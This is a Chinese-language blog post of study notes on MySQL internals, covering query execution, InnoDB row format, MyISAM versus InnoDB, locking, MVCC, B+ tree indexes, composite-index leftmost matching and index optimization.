    <url>/2024/03/07/%E6%95%B0%E6%8D%AE%E5%BA%93/MySQL(1)%EF%BC%9A%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E%E3%80%81%E7%B4%A2%E5%BC%95/</url>
    <content><![CDATA[<h1>1 MySQL基础架构</h1>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403252206970.png" alt="image.png|500"><br>
MySQL 可以简单分为 Server 层和存储引擎层这两层，MySQL 支持 InnoDB、MyISAM、Memory 等多种存储引擎。</p>
<ul class="lvl-0">
<li class="lvl-2">Server 层负责建立连接、分析和执行SQL。所有的内置函数（如日期、时间、数学和加密函数等）和所有跨存储引擎的功能（如存储过程、触发器、视图等。）都在 Server 层实现。</li>
<li class="lvl-2">引擎层负责数据的存储和读取</li>
</ul>
<h2 id="1-1-SQL语句执行流程">1.1 SQL语句执行流程</h2>
<h3 id="1-1-1-连接器（长连接、短连接）">1.1.1 连接器（长连接、短连接）</h3>
<pre><code>- 与客户端进行 TCP 三次握手建立连接；
- 校验客户端的用户名和密码，如果用户名或密码不对，则会报错；
- 如果用户名和密码都对了，会读取该用户的权限，然后后面的权限逻辑判断都基于此时读取到的权限
</code></pre>
<h3 id="1-1-2-查询缓存">1.1.2 查询缓存</h3>
<p>解析SQL语句的第一个字段，查看语句类型；如果SQL师查询语句，先查找缓存数据</p>
<h3 id="1-1-3-解析SQL语句（解析器）">1.1.3 解析SQL语句（解析器）</h3>
<pre><code>- 词法分析
- 语法分析
</code></pre>
<h3 id="1-1-4-执行SQL">1.1.4 执行SQL</h3>
<h4 id="2-1-4-1-预处理器：">2.1.4.1 预处理器：</h4>
<ul class="lvl-0">
<li class="lvl-2">
<p>检查 SQL 查询语句中的表或者字段是否存在；</p>
</li>
<li class="lvl-2">
<p>将 <code>select *</code> 中的 <code>*</code> 符号，扩展为表上的所有列；</p>
</li>
</ul>
<h4 id="2-1-4-2-优化器：">2.1.4.2 优化器：</h4>
<ul class="lvl-0">
<li class="lvl-2">
<p>优化器主要负责将 SQL 查询语句的执行方案确定下来，为SQL语句指定<strong>执行计划</strong>（选择某个索引，explain）</p>
</li>
</ul>
<h4 id="2-1-4-3-执行器：与存储引擎交互">2.1.4.3 执行器：与存储引擎交互</h4>
<ul class="lvl-0">
<li class="lvl-2">
<p>主键索引查询</p>
</li>
<li class="lvl-2">
<p>全表扫描</p>
</li>
<li class="lvl-2">
<p>索引下推：索引下推能够减少<strong>二级索引</strong>在查询时的回表操作，提高查询的效率，因为它将 Server 层部分负责的事情，交给存储引擎层去处理了。</p>
</li>
</ul>
<p><a href="https://xiaolincoding.com/mysql/base/how_select.html#%E6%89%A7%E8%A1%8C%E5%99%A8">执行一条 select 语句，期间发生了什么？ | 小林coding (xiaolincoding.com)</a></p>
<h2 id="1-2-MySQL一行记录存储">1.2 MySQL一行记录存储</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405132123653.png" alt="image.png"></p>
<h3 id="1-2-1-NULL值列表：">1.2.1 NULL值列表：</h3>
<p>如果存在允许 NULL 值的列，则每个列对应一个二进制位（bit），二进制位按照列的顺序逆序排列。</p>
<h3 id="1-2-2-记录头信息">1.2.2 记录头信息</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>delete_mask</code> ：标识此条数据是否被删除。从这里可以知道，我们执行 detele 删除记录的时候，并不会真正的删除记录，只是将这个记录的 delete_mask 标记为 1。</p>
</li>
<li class="lvl-2">
<p><mark>next_record</mark>：<mark>下一条记录的位置</mark>。从这里可以知道，记录与记录之间是通过链表组织的。在前面我也提到了，指向的是下一条记录的「记录头信息」和「真实数据」之间的位置，这样的好处是向左读就是记录头信息，向右读就是真实数据，比较方便。</p>
</li>
<li class="lvl-2">
<p>record_type：表示当前记录的类型，0表示普通记录，1表示B+树非叶子节点记录，2表示最小记录，3表示最大记录</p>
</li>
</ul>
<h3 id="1-2-3-记录的真实数据">1.2.3 记录的真实数据</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>row_id：有主键或者唯一约束列，没有 row_id 隐藏字段。如果既没有指定主键，又没有唯一约束，那么 InnoDB 就会为记录添加 row_id 隐藏字段。row_id不是必需的，占用 6 个字节。</p>
</li>
<li class="lvl-2">
<p>trx_id：<code>事务id</code>，表示这个数据是由哪个事务生成的。 trx_id是必需的，占用 6 个字节。</p>
</li>
<li class="lvl-2">
<p><mark>roll_pointer</mark>：这条记录<code>上一个版本的指针</code>。roll_pointer 是必需的，占用 7 个字节。</p>
</li>
</ul>
<blockquote>
<p>[!Note] 行溢出<br>
MySQL 中磁盘和内存交互的基本单位是页，一个页的大小一般是 16KB，也就是 16384字节，而一个 varchar(n) 类型的列最多可以存储 65532字节，一些大对象如 TEXT、BLOB 可能存储更多的数据，这时一个页可能就存不了一条记录。这个时候就会发生行溢出，多的数据就会存到另外的==「溢出页」==中。当发生行溢出时，在记录的真实数据处只会保存该列的一部分数据，而把剩余的数据放在「溢出页」中，然后真实数据处用 20 字节存储指向溢出页的地址，从而可以找到剩余数据所在的页。</p>
</blockquote>
<blockquote>
<p>MySQL 的 NULL 值是怎么存放的？</p>
</blockquote>
<p>MySQL 的 Compact 行格式中会用「NULL值列表」来标记值为 NULL 的列，NULL 值并不会存储在行格式中的真实数据部分。</p>
<p>NULL值列表会占用 1 字节空间，当表中所有字段都定义成 NOT NULL，行格式中就不会有 NULL值列表，这样可节省 1 字节的空间。</p>
<blockquote>
<p>MySQL 怎么知道 varchar(n) 实际占用数据的大小？</p>
</blockquote>
<p>MySQL 的 Compact 行格式中会用「变长字段长度列表」存储变长字段实际占用的数据大小。</p>
<h1>2 MySQL存储引擎</h1>
<h2 id="2-1-MyISAM和InnoDB">2.1 MyISAM和InnoDB</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>是否支持行级锁</strong>：MyISAM 只有表级锁(table-level locking)，而 InnoDB 支持行级锁(row-level locking)和表级锁,默认为行级锁。</p>
</li>
<li class="lvl-2">
<p><mark>事务支持</mark>： InnoDB支持事务，具有提交、回滚和崩溃恢复能力，可以保护用户数据。它使用了一种称为“写前日志”（write-ahead logging，WAL）的技术，先写日志，再写数据，保证了事务的完整性。 MyISAM不支持事务，这意味着在MyISAM中进行的更改无法回滚，且如果发生崩溃，数据可能会损坏。</p>
</li>
<li class="lvl-2">
<p>是否支持外键：MyISAM 不支持，而 InnoDB 支持。外键有助于维护数据的引用完整性和一致性，但是对性能有一定的损耗。</p>
</li>
<li class="lvl-2">
<p><strong>是否支持数据库异常崩溃后的安全恢复</strong>：MyISAM 不支持，而 InnoDB 支持。使用 InnoDB 的数据库在异常崩溃后，数据库重新启动的时候会保证数据库恢复到崩溃前的状态。这个恢复的过程依赖于 <code>redo log</code> 。</p>
</li>
<li class="lvl-2">
<p><strong>是否支持 MVCC</strong>：MyISAM 不支持，而 InnoDB 支持。</p>
</li>
<li class="lvl-2">
<p><strong>数据存储索引实现不一样</strong>：都使用B+Tree作为索引结构。 InnoDB使用聚簇索引来组织数据，其数据文件本身就是索引文件,表数据和主键索引存储在一起。此外，InnoDB还支持全文索引和哈希索引。 MyISAM将数据和索引分开存储，数据文件（MYD）和索引文件（MYI）是分离的。MyISAM也支持全文索引，但不支持哈希索引。</p>
</li>
<li class="lvl-2">
<p>数据缓存策略和机制实现不同：InnoDB 使用缓冲池<code>（Buffer Pool）</code>缓存数据页和索引页，MyISAM 使用键缓存（Key Cache）仅缓存索引页而不缓存数据页。</p>
</li>
<li class="lvl-2">
<p>性能： InnoDB在处理大量读写操作时通常表现更好，特别是在高并发环境下。这得益于其行级锁和事务支持。 MyISAM在处理只读查询时可能更快，特别是当数据量很大且内存充足时。然而，在写操作频繁的场景下，MyISAM的性能可能会下降。</p>
</li>
<li class="lvl-3">
<p>存储空间： InnoDB的存储空间通常比MyISAM大，因为它需要额外的空间来存储事务日志、行级锁等信息。此外，InnoDB的数据文件大小是动态增长的。 MyISAM的存储空间相对较小，数据文件大小是固定的（可以通过配置修改）。但是，MyISAM不支持数据压缩功能。</p>
</li>
</ul>
<blockquote>
<p>MyISAM适合： 插入不频繁，查询非常频繁，如果执行大量的SELECT，MyISAM是更好的选择， 没有事务。 InnoDB适合： 可靠性要求比较高，或者要求事务； 表更新和查询都相当的频繁， 大量的INSERT或UPDATE</p>
</blockquote>
<blockquote>
<p>InnoDB存储引擎：B+树索引的叶子结点保存数据本身<br>
MyISAM存储引擎：B+树索引的叶子结点保存数据的物理地址</p>
</blockquote>
<h1>3 乐观锁和悲观锁</h1>
<p>悲观锁，先获取锁，再进行业务操作，一般就是利用类似 SELECT … FOR UPDATE 这样的语句，对数据加锁，避免其他事务意外修改数据。 当数据库执行SELECT … FOR UPDATE时会获取被select中的数据行的行锁，select for update获取的行锁会在当前事务结束时自动释放，因此必须在事务中使用。</p>
<p>乐观锁，先进行业务操作，只在最后实际更新数据时进行检查数据是否被更新过。Java 并发包中的 AtomicFieldUpdater 类似，也是利用 CAS 机制，并不会对数据加锁，而是通过对比数据的时间戳或者版本号，来实现乐观锁需要的版本判断。</p>
<h1>4 MVCC（多版本并发控制）</h1>
<blockquote>
<p><strong>通过在每个数据行上维护多个版本的数据来实现的。当一个事务要对数据库中的数据进行修改时，MVCC 会为该事务创建一个数据快照，而不是直接修改实际的数据行。</strong></p>
</blockquote>
<p>多版本并发控制（MVCC，Multiversion Concurrency Control），是行级锁的变种，在很多情况下避免了加锁操作，因此开销更低。实现了非阻塞的读操作，写操作也只锁定必要的行。</p>
<p>MVCC的实现，是通过保存数据在某个时间点的快照来实现的。也就是说，不管需要执行多长时间，每个事务看到的数据都是一致的。根据事务开始的时间不同，每个事务对同一张表，同一时刻看到的数据可能是不一样的。</p>
<p>InnoDB的MVCC，是通过在每行记录后面保存两个隐藏的列来实现的。这两个列，一个保存了行的创建时间，一个保存行的过期时间（或删除时间）。当然存储的并不是实际的时间值，而是系统版本号（system version number）。每开始一个新的事务，系统版本号都会自动递增。事务开始时刻的系统版本号会作为事务的版本号，用来和查询到的每行记录的版本号进行比较。</p>
<p><strong>MVCC</strong> 是多版本并发控制方法，即对一份数据会存储多个版本，通过事务的可见性来保证事务能看到自己应该看到的版本。通常会有一个全局的版本分配器来为每一行数据设置版本号，版本号是唯一的。</p>
<p>MVCC 在 MySQL 中实现所依赖的手段主要是: <mark>隐藏字段、read view、undo log</mark>。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>undo log : undo log 用于记录某行数据的多个版本的数据。</p>
</li>
<li class="lvl-2">
<p>read view 和 隐藏字段 : 用来判断当前版本数据的可见性。</p>
</li>
</ul>
<p><a href="https://javaguide.cn/database/mysql/innodb-implementation-of-mvcc.html">InnoDB存储引擎对MVCC的实现 | JavaGuide</a></p>
<h1>5 索引</h1>
<blockquote>
<p><strong>索引是存储引擎用于快速查询和检索数据的数据结构，其本质可以看成是一种排序好的数据结构，提高查询效率。</strong></p>
</blockquote>
<p>在创建表时，InnoDB 存储引擎会根据不同的场景选择不同的列作为索引：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>如果有主键，默认会使用主键作为聚簇索引的索引键（key）；</p>
</li>
<li class="lvl-2">
<p>如果没有主键，就选择第一个不包含 NULL 值的唯一列作为聚簇索引的索引键（key）；</p>
</li>
<li class="lvl-2">
<p>在上面两个都没有的情况下，InnoDB 将自动生成一个隐式自增 id 列作为聚簇索引的索引键（key）；</p>
</li>
</ul>
<h2 id="5-1-底层数据结构">5.1 底层数据结构</h2>
<h3 id="5-1-1-AVL树">5.1.1 AVL树</h3>
<blockquote>
<p>在使用 AVL 树时，每个树节点仅存储一个数据，而每次进行磁盘 IO 时只能读取一个节点的数据，如果需要查询的数据分布在多个节点上，那么就需要进行多次磁盘 IO。 <strong>磁盘 IO 是一项耗时的操作</strong></p>
</blockquote>
<h3 id="5-1-2-B树和B-树">5.1.2 B树和B+树</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>B 树的所有节点既存放键(key) 也存放数据(data)，而 B+树只有叶子节点存放 key 和 data，其他内节点只存放 key。</p>
</li>
<li class="lvl-2">
<p>B 树的叶子节点都是独立的;B+树的叶子节点有一条引用链指向与它相邻的叶子节点。</p>
</li>
<li class="lvl-2">
<p>B 树的检索的过程相当于对范围内的每个节点的关键字做二分查找，可能还没有到达叶子节点，检索就结束了。而 B+树的检索效率就很稳定了，任何查找都是从根节点到叶子节点的过程，叶子节点的顺序检索很明显。</p>
</li>
<li class="lvl-2">
<p>在 B 树中进行范围查询时，首先找到要查找的下限，然后对 B 树进行中序遍历，直到找到查找的上限；而 B+树的范围查询，只需要对链表进行遍历即可。</p>
</li>
</ul>
<h3 id="5-1-3-为什么选择B-树作为索引">5.1.3 为什么选择B+树作为索引</h3>
<p>文件索引和数据库索引存放在硬盘上，性能瓶颈在IO上。数据库系统巧妙利用了局部性原理与磁盘预读原理，将一个节点的大小设为等于一个页，这样每个节点只需要一次I/O就可以完全载入。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><mark>B+ 树的非叶子节点不存放实际的记录数据，仅存放索引</mark>，因此数据量相同的情况下，相比即存索引又存记录的 B 树，B+树的非叶子节点可以存放更多的索引，因此 B+ 树可以比 B 树更「矮胖」，查询底层节点的磁盘 I/O次数会更少。</p>
</li>
<li class="lvl-2">
<p>B+ 树有大量的冗余节点（所有非叶子节点都是冗余索引），这些冗余索引让 B+ 树在<mark>插入、删除的效率都更高</mark>，比如删除根节点的时候，不会像 B 树那样会发生复杂的树的变化；</p>
</li>
<li class="lvl-2">
<p>B+ 树叶子节点之间用链表连接了起来，有利于<mark>范围查询</mark>，而 B 树要实现范围查询，因此只能通过树的遍历来完成范围查询，这会涉及多个节点的磁盘 I/O 操作，范围查询效率不如 B+ 树。</p>
</li>
</ul>
<h2 id="5-2-索引类型">5.2 索引类型</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>按「数据结构」分类：B+tree索引、Hash索引、Full-text索引。</p>
</li>
<li class="lvl-2">
<p>按「物理存储」分类：聚簇索引（主键索引）、二级索引（辅助索引）。</p>
</li>
<li class="lvl-2">
<p>按「字段特性」分类：主键索引、唯一索引、普通索引、前缀索引。</p>
</li>
<li class="lvl-2">
<p>按「字段个数」分类：单列索引、联合索引。</p>
</li>
</ul>
<h3 id="5-2-1-数据结构">5.2.1 数据结构</h3>
<h4 id="B-Tree索引">B-Tree索引</h4>
<blockquote>
<p>B-Tree索引能够加快访问数据的速度，因为存储引擎不再需要进行全表扫描来获取需要的数据</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>MyISAM索引通过数据的物理位置引用被索引的行，B+Tree 叶节点的 data 域存放的是数据记录的地址（非聚簇索引），索引文件和数据文件分离</p>
</li>
<li class="lvl-2">
<p>InnoDB则根据主键引用被索引的行。其数据文件本身就是索引文件。 InnoDB 表数据文件本身就是主索引，辅助索引的 data 域存储相应记录主键的值而不是地址。</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405141106447.png" alt=""></p>
<p><strong>可以使用B-Tree索引的查询类型</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>全值匹配：全值匹配指的是和索引中的所有列进行匹配</p>
</li>
<li class="lvl-2">
<p>匹配最左前缀</p>
</li>
<li class="lvl-2">
<p>匹配列前缀：也可以只匹配某一列的值的开头部分</p>
</li>
<li class="lvl-2">
<p>匹配范围值</p>
</li>
<li class="lvl-2">
<p>精确匹配某一列并范围匹配另外一列</p>
</li>
</ul>
<h4 id="哈希索引">哈希索引</h4>
<blockquote>
<p>不支持顺序和范围查询</p>
</blockquote>
<h4 id="全文索引">全文索引</h4>
<p>对文本的内容进行分词，进行搜索，适用于字符串列</p>
<h3 id="5-2-2-物理存储">5.2.2 物理存储</h3>
<h4 id="5-2-2-1-主键索引与二级索引">5.2.2.1 主键索引与二级索引</h4>
<p>主键索引：聚集索引的叶子节点存放的是实际数据，所有完整的用户记录都存放在聚集索引的叶子节点二级索引：叶子节点存放的是主键值，而不是实际数据。</p>
<p>在查询时使用了二级索引，如果查询的数据能在二级索引里查询的到，那么就不需要<mark>回表</mark>，这个过程就是<mark>覆盖索引</mark>(索引包含（或者说覆盖）所有需要查询的字段的值)。如果查询的数据不在二级索引里，就会先检索二级索引，找到对应的叶子节点，获取到主键值后，然后再检索主键索引，就能查询到数据了，这个过程就是<mark>回表</mark>。</p>
<h4 id="5-2-2-2-聚簇-集-索引与非聚簇-集-索引">5.2.2.2 聚簇(集)索引与非聚簇(集)索引</h4>
<ul class="lvl-0">
<li class="lvl-2">
<p>聚簇索引（聚集索引）：索引结构和数据一起存放的索引，InnoDB 中的主键索引就属于聚簇索引。在聚簇索引中，数据行按照索引键值的顺序存储，也就是说，索引的叶子节点包含了实际的数据行。</p>
</li>
<li class="lvl-2">
<p>非聚簇索引（非聚集索引）：索引结构和数据分开存放的索引，二级索引(辅助索引)就属于非聚簇索引。</p>
</li>
</ul>
<p>因为写入是乱序的，innodb 不得不频繁的做页分裂操作，以便为新的行分配空间，页分裂导致移动大量的数据，影响性能。 由于频繁的页分裂，页会变得稀疏并被不规则的填充，最终会导致数据会有<mark>碎片</mark>。</p>
<p>聚簇索引优缺点：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>二级索引访问需要两次索引查找，而不是一次。二级索引叶子节点保存的不是指向行的物理位置的指针，而是行的主键值。InnoDB在移动行或者数据页分裂时无须更新二级索引中的这个“指针”。</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403252334238.png" alt="image.png|475"></p>
<h3 id="5-2-3-字段特性">5.2.3 字段特性</h3>
<h4 id="唯一索引">唯一索引</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name  (</span><br><span class="line">  ....</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (index_column_1) <span class="keyword">USING</span> BTREE</span><br><span class="line">  <span class="keyword">UNIQUE</span> KEY(index_column_1,index_column_2,...) </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">UNIQUE</span> INDEX index_name</span><br><span class="line"><span class="keyword">ON</span> table_name(index_column_1,index_column_2,...); </span><br></pre></td></tr></table></figure>
<h4 id="前缀索引">前缀索引</h4>
<p>使用前缀索引的目的是为了减少索引占用的存储空间，提升查询效率。</p>
<p>前缀索引：前缀索引是指对字符类型字段的前几个字符建立的索引，而不是在整个字段上建立的索引，前缀索引可以建立在字段类型为 char、 varchar、binary、varbinary 的列上。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用前缀索引的目的是为了减少索引占用的存储空间，提升查询效率。</p>
</li>
</ul>
<h3 id="5-2-4-字段个数">5.2.4 字段个数</h3>
<h4 id="单列索引">单列索引</h4>
<h4 id="联合索引">联合索引</h4>
<p><strong>建立联合索引时，要把区分度大的字段排在前面，这样区分度大的字段越有可能被更多的 SQL 使用到</strong>。</p>
<p>使用表中的多个字段创建索引，就是 <strong>联合索引</strong>，也叫 <strong>组合索引</strong> 或 <strong>复合索引</strong>。</p>
<blockquote>
<p>[!note] 联合索引底层存储结构(和其他种类的索引的存储结构有什么区别?</p>
</blockquote>
<p>联合索引的非叶子节点用两个字段的值作为 B+Tree 的 key 值</p>
<p>使用联合索引时，存在<mark>最左匹配原则</mark>，也就是按照最左优先的方式进行索引的匹配</p>
<p>联合索引是数据库中一种常见的索引类型，它允许在多个列上创建索引，以提高查询性能。与单列索引相比，联合索引的底层存储结构有一些区别，主要体现在如何组织和存储索引数据的方式上。</p>
<ol>
<li class="lvl-3">
<p><strong>存储数据的组织方式</strong>：</p>
</li>
<li class="lvl-3">
<p><strong>索引维护的复杂性</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">单列索引：单列索引的维护相对简单，因为它只需要维护单个列的值和指针。</li>
<li class="lvl-6">联合索引：联合索引的维护相对复杂一些，因为它需要考虑多个列值的组合。当表中的数据发生变化时，数据库需要确保联合索引中的多个列值的组合保持有序，这可能需要更多的资源和时间。</li>
</ul>
</li>
</ol>
<p>联合索引在适当的情况下可以提供更好的查询性能，特别是对于涉及到联合索引中列值的组合的查询。然而，需要注意的是，联合索引的创建和维护可能会带来一些额外的开销，并且需要根据具体的查询需求和数据模式来合理选择索引策略。</p>
<blockquote>
<p>[!question]<br>
select * from t_table where a &gt; 1 and b = 2<br>
<strong>只有 a 字段用到了联合索引进行索引查询，而 b 字段并没有使用到联合索引</strong>。</p>
</blockquote>
<blockquote>
<p>[!question]<br>
select * from t_table where a &gt;= 1 and b = 2<br>
从符合 a = 1 and b = 2 条件的第一条记录开始扫描，而不需要从第一个 a 字段值为 1 的记录开始扫描，<strong>Q2 这条查询语句 a 和 b 字段都用到了联合索引进行索引查询</strong></p>
</blockquote>
<blockquote>
<p>[!question]<br>
SELECT * FROM t_table WHERE a BETWEEN 2 AND 8 AND b = 2<br>
 MySQL 的 BETWEEN 包含 value1 和 value2 边界值，所以类似于 Q2 查询语句，因此 <strong>Q3 这条查询语句 a 和 b 字段都用到了联合索引进行索引查询</strong>。</p>
</blockquote>
<blockquote>
<p>[!question]<br>
SELECT * FROM t_user WHERE name like ‘j%’ and age = 22<br>
二级索引记录的 name 字段值为 ‘j’ 时，可以通过 age = 22 条件减少需要扫描的二级索引记录范围（age 字段可以利用联合索引进行索引查询的意思）。也就是说，从符合 <code>name = 'j' and age = 22</code> 条件的第一条记录时开始扫描，而不需要从第一个 name 为 j 的记录开始扫描 。</p>
</blockquote>
<p>联合索引的最左匹配原则，在遇到范围查询（如 &gt;、&lt;）的时候，就会停止匹配，也就是范围查询的字段可以用到联合索引，但是在范围查询字段的后面的字段无法用到联合索引。注意，==对于  &gt;=、&lt;=、BETWEEN、like 前缀匹配的范围查询,并不会停止匹配。</p>
<h3 id="5-2-5-冗余索引和重复索引">5.2.5 冗余索引和重复索引</h3>
<p>冗余索引指的是索引的功能相同，能够命中索引(a, b)就肯定能命中索引(a) ，那么索引(a)就是冗余索引。如（name,city ）和（name ）这两个索引就是冗余索引，能够命中前者的查询肯定是能够命中后者的 在大多数情况下，都应该尽量扩展已有的索引而不是创建新索引</p>
<h2 id="5-3-索引的优点（三星评价）">5.3 索引的优点（三星评价）</h2>
<p>索引将相关的记录放到一起则获得一星；如果索引中的数据顺序和查找中的排列顺序一致则获得二星；如果索引中的列包含了查询中需要的全部列则获得“三星”。</p>
<h2 id="5-4-最左匹配">5.4 最左匹配</h2>
<p>查询只能使用索引的最左前缀，直到遇到第一个范围条件列。最左前缀匹配原则指的是在使用联合索引时，MySQL 会<mark>根据索引中的字段顺序，从左到右依次匹配查询条件中的字段</mark>。如果查询条件与索引中的最左侧字段相匹配，那么 MySQL 就会使用索引来过滤数据，这样可以提高查询效率。</p>
<p>最左匹配原则会一直向右匹配，直到遇到范围查询（如 &gt;、&lt;）为止，范围查询的字段可以用到联合索引。对于 &gt;=、&lt;=、BETWEEN 以及<mark>前缀匹配 LIKE</mark> 的范围查询，不会停止匹配</p>
<p>当MySQL使用联合索引进行查询时，会从索引的最左边开始匹配查询条件，如果查询条件中包含了索引左边的列，那么MySQL才可能会使用这个索引来优化查询。如果查询条件没有包含左边的列或者左边的列出现一些范围查询（&gt;、&lt;、between等），即使其他列都在索引中，MySQL也可能不会使用这个索引。</p>
<h2 id="5-5-索引下推">5.5 索引下推</h2>
<p><strong>索引下推（Index Condition Pushdown，简称 ICP）</strong> 是 <strong>MySQL 5.6</strong> 版本中提供的一项索引优化功能，它允许存储引擎在索引遍历过程中，执行部分 <code>WHERE</code>字句的判断条件，直接过滤掉不满足条件的记录，从而减少回表次数，提高查询效率。将Server层筛选数据的工作，下推到引擎层处理。</p>
<p>在没有索引下推的情况下，MySQL会先从索引中获取所有可能满足条件的数据行的主键，然后根据这些主键检索完整的数据行(即回表)，最后再应用WHERE条件进行过滤。而有了索引下推，MySQL可以在扫描索引的同时，直接<strong>根据索引中的值来判断是否满足WHERE条件</strong>，从而避免不必要的回表操作。</p>
<p>对于联合索引(a,b)，在执行 <code>select * from table where a &gt; 1 and b = 2</code> 语句的时候，只有 a 字段能用到索引。在联合索引的 B+Tree 找到第一个满足条件的主键值（ID 为 2）后：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>不使用索引下推：从ID=2（主键值）回表，在主键索引中找出数据行，在对比b字段值</p>
</li>
<li class="lvl-2">
<p>索引下推：<strong>可以在联合索引遍历过程中，对联合索引中包含的字段先做判断，直接过滤掉不满足条件的记录，减少回表次数</strong>。（Using index condition）</p>
</li>
</ul>
<p>对于联合索引，在遇到范围查询时，后面的索引无法被用到。不使用索引下推，则根据主键值回表查询。但是可以根据索引包含的字段先做判断</p>
<h2 id="5-6-什么时候需要-不需要创建索引？">5.6 什么时候需要 / 不需要创建索引？</h2>
<p>索引最大的好处是提高查询速度，但是索引也是有缺点的，比如：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>需要占用物理空间，数量越大，占用空间越大；</p>
</li>
<li class="lvl-2">
<p>创建索引和维护索引要耗费时间，这种时间随着数据量的增加而增大；</p>
</li>
<li class="lvl-2">
<p>会降低表的增删改的效率，因为每次增删改索引，B+ 树为了维护索引有序性，都需要进行动态维护。</p>
</li>
</ul>
<h3 id="5-6-1-什么时候适用索引？">5.6.1 什么时候适用索引？</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>字段有<code>唯一性</code>限制的，比如商品编码；</p>
</li>
<li class="lvl-2">
<p>经常用于 <code>WHERE</code> 查询条件的字段，这样能够提高整个表的查询速度，如果查询条件不是一个字段，可以建立联合索引。</p>
</li>
<li class="lvl-2">
<p>经常用于 <code>GROUP BY</code> 和 <code>ORDER BY</code> 的字段，这样在查询的时候就不需要再去做一次排序了，因为我们都已经知道了建立索引之后在 B+Tree 中的记录都是排序好的。</p>
</li>
<li class="lvl-2">
<p>字段非空</p>
</li>
<li class="lvl-2">
<p><mark>字段区分度高</mark></p>
</li>
</ul>
<h3 id="5-6-2-什么时候不需要创建索引？">5.6.2 什么时候不需要创建索引？</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>WHERE</code> 条件，<code>GROUP BY</code>，<code>ORDER BY</code> 里用不到的字段，索引的价值是快速定位，如果起不到定位的字段通常是不需要创建索引的，因为索引是会占用物理空间的。</p>
</li>
<li class="lvl-2">
<p><code>字段不具有区分度</code>，字段中存在大量重复数据，不需要创建索引，比如性别字段，只有男女，如果数据库表中，男女的记录分布均匀，那么无论搜索哪个值都可能得到一半的数据。在这些情况下，还不如不要索引，因为 MySQL 还有一个查询优化器，查询优化器发现某个值出现在表的数据行中的百分比很高的时候，它一般会忽略索引，进行全表扫描。</p>
</li>
<li class="lvl-2">
<p>表数据太少的时候，不需要创建索引；</p>
</li>
<li class="lvl-2">
<p><code>经常更新的字段</code>不用创建索引，比如不要对电商项目的用户余额建立索引，因为索引字段频繁修改，由于要维护 B+Tree的有序性，那么就需要频繁的重建索引，这个过程是会影响数据库性能的。</p>
</li>
</ul>
<h2 id="5-7-索引优化">5.7 索引优化</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>前缀索引优化：使用字符串的前几个字符建立索引，减少索引字段大小</p>
</li>
<li class="lvl-2">
<p>覆盖索引：要查询的字段，在叶子节点上都能找到对应的索引</p>
</li>
<li class="lvl-2">
<p>主键索引最好是自增的：每次插入一条新记录，都是追加操作，不需要重新移动数据</p>
</li>
<li class="lvl-2">
<p>索引最好设置为NOT NULL</p>
</li>
<li class="lvl-2">
<p>防止索引失效，最左前缀匹配</p>
</li>
<li class="lvl-2">
<p>选择合适的列进行索引，选择经常用于查询条件的列，避免对经常修改的列建立索引</p>
</li>
</ul>
<p><strong>如果我们使用自增主键</strong>，那么每次插入的新数据就会按顺序添加到当前索引节点的位置，不需要移动已有的数据，当页面写满，就会自动开辟一个新页面。因为每次<strong>插入一条新记录，都是追加操作，不需要重新移动数据</strong>，因此这种插入数据的方法效率非常高。</p>
<p><strong>如果我们使用非自增主键</strong>，由于每次插入主键的索引值都是随机的，因此每次插入新的数据时，就可能会插入到现有数据页中间的某个位置，这将不得不移动其它数据来满足新数据的插入，甚至需要从一个页面复制数据到另外一个页面，我们通常将这种情况称为<mark>页分裂</mark>。页分裂还有可能会造成大量的<mark>内存碎片</mark>，导致索引结构不紧凑，从而影响查询效率。</p>
<h3 id="5-7-1-NULL和’-的区别">5.7.1 NULL和’'的区别</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>NULL</code> 代表一个不确定的值,就算是两个 <code>NULL</code>,它俩也不一定相等。例如，<code>SELECT NULL=NULL</code>的结果为 false，但是在我们使用<code>DISTINCT</code>,<code>GROUP BY</code>,<code>ORDER BY</code>时,<code>NULL</code>又被认为是相等的。</p>
</li>
<li class="lvl-2">
<p><code>''</code>的长度是 0，是不占用空间的，而<code>NULL</code> 是需要占用空间的。</p>
</li>
<li class="lvl-2">
<p><code>NULL</code> 会影响聚合函数的结果。例如，<code>SUM</code>、<code>AVG</code>、<code>MIN</code>、<code>MAX</code> 等聚合函数会忽略 <code>NULL</code> 值。 <code>COUNT</code> 的处理方式取决于参数的类型。如果参数是 <code>*</code>(<code>COUNT(*)</code>)，则会统计所有的记录数，包括 <code>NULL</code> 值；如果参数是某个字段名(<code>COUNT(列名)</code>)，则会忽略 <code>NULL</code> 值，只统计非空值的个数。</p>
</li>
<li class="lvl-2">
<p>查询 <code>NULL</code> 值时，必须使用 <code>IS NULL</code> 或 <code>IS NOT NULLl</code> 来判断，而不能使用 =、!=、 &lt;、&gt; 之类的比较运算符。而<code>''</code>是可以使用这些比较运算符的。</p>
</li>
</ul>
